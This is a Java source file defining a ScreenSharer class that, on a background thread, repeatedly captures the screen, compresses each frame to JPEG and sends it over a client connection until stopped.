package client.features;

import client.connection.ClientConnection;
import client.connection.ID;
import client.utils.TimerUtil;
import client.utils.system.JNAScreenShot;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ScreenSharer {
    private ClientConnection connection;
    public boolean sharingScreen = false;
    private final TimerUtil timer = new TimerUtil();

    public ScreenSharer(ClientConnection connection) {
        try {
            this.connection = connection;
        } catch (Exception ignored) {
        }
    }

    private static final ImageWriter writer;
    private static final ImageWriteParam param;

    static {
        // Create ImageWriter and ImageWriteParam once (possibly in a constructor or initialization method)
        writer = ImageIO.getImageWritersByFormatName("jpg").next();
        param = writer.getDefaultWriteParam();
        param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        param.setCompressionQuality((float) 0.5);
    }

    public byte[] compressImage(BufferedImage image) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             MemoryCacheImageOutputStream mcios = new MemoryCacheImageOutputStream(baos)) {

            // Use the pre-configured ImageWriter and ImageWriteParam
            writer.setOutput(mcios);
            writer.write(null, new IIOImage(image, null, null), param);

            image.flush();
            return baos.toByteArray();
        }
    }

    public byte[] getScreenData(BufferedImage screenCapture) throws IOException {
        return compressImage(screenCapture);
    }

    public void start(){
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.submit(() -> {
            sharingScreen = true;
            while (sharingScreen) {
                try {
                    Thread.sleep(64); // Adjust frame rate
                    BufferedImage screenCapture = JNAScreenShot.getScreenshot();
                    byte[] compressedImage = getScreenData(screenCapture);
                    timer.isTimeOn = false;
                    connection.sendHead(ID.SCREEN());
                    connection.sendData(compressedImage);
                    System.gc();
                } catch (Exception e) {
                    sharingScreen = false;
                }
            }
        });

        System.gc();
    }

    public void stop() {
        sharingScreen = false;
    }
}
